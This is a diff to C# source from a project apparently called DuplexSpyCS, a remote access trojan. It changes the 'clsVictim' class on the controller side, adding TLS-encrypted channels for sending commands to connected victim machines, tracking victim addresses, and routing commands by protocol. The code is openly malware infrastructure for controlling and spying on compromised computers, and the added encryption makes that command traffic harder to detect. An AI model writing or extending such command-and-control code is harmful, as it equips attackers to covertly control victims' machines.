@@ -6,12 +6,15 @@ using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
 using DuplexSpyCS;
+using System.Net.Security;
 
 public class clsVictim
 {
     //SOCKET
-    public clsListener m_listener { get; set; }
-    public Socket socket;
+    public clsListener m_listener { get; init; }
+    public Socket socket { get; init; }
+    public SslStream m_sslClnt { get; init; }
+
     public static int MAX_BUFFER_LENGTH = 65536; //Buffer size.
     public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
     public string ID; //VICTIM ONLINE ID
@@ -65,6 +68,19 @@ public class clsVictim
         m_listener = listener;
     }
 
+    public clsVictim(Socket sktClnt, SslStream sslStream, clsListener listener)
+    {
+        socket = sktClnt;
+        m_sslClnt = sslStream;
+        m_listener = listener;
+
+        string[] split = socket.RemoteEndPoint.ToString().Split(':');
+        this.socket = socket;
+        r_addr = split[0];
+        r_port = int.Parse(split[1]);
+        ID = "[NOT YET]";
+    }
+
     public void Send(int Command, int Param, string data)
     {
         Send(Command, Param, Encoding.UTF8.GetBytes(data));
@@ -109,15 +125,50 @@ public class clsVictim
     }
     public void SendCommand(string command)
     {
-        encSend(2, 0, command);
+        switch (m_listener.m_protocol)
+        {
+            case enListenerProtocol.TCP:
+                encSend(2, 0, command);
+                break;
+            case enListenerProtocol.TLS:
+                fnSslSend(command);
+                break;
+            case enListenerProtocol.HTTP:
+
+                break;
+        }
     }
-    public void fnSendCommand(string[] aMsg)
+
+    public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|'));
+    public void fnSendCommand(string[] aMsg) => fnSendCommand(aMsg.ToList());
+    public void fnSendCommand(List<string> lsMsg) => SendCommand(string.Join("|", lsMsg));
+
+    public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|'));
+    public void fnSslSend(string[] asMsg) => fnSslSend(asMsg.ToList());
+    public void fnSslSend(List<string> lsMsg)
     {
-        fnSendCommand(aMsg.ToList());
+        string szMsg = string.Join("|", lsMsg);
+        byte[] abMsg = Encoding.UTF8.GetBytes(szMsg);
+
+        clsDSP dsp = new clsDSP(0, 0, abMsg);
+        byte[] abBuffer = dsp.GetBytes();
+
+        fnSslSendRaw(abBuffer);
     }
-    public void fnSendCommand(List<string> lsMsg)
+
+    public void fnSslSendRaw(byte[] abBuffer)
     {
-        SendCommand(string.Join("|", lsMsg));
+        m_sslClnt.BeginWrite(abBuffer, 0, abBuffer.Length, new AsyncCallback((ar) =>
+        {
+            try
+            {
+                m_sslClnt.EndWrite(ar);
+            }
+            catch (Exception ex)
+            {
+
+            }
+        }), abBuffer);
     }
 
     public void Reconnect()
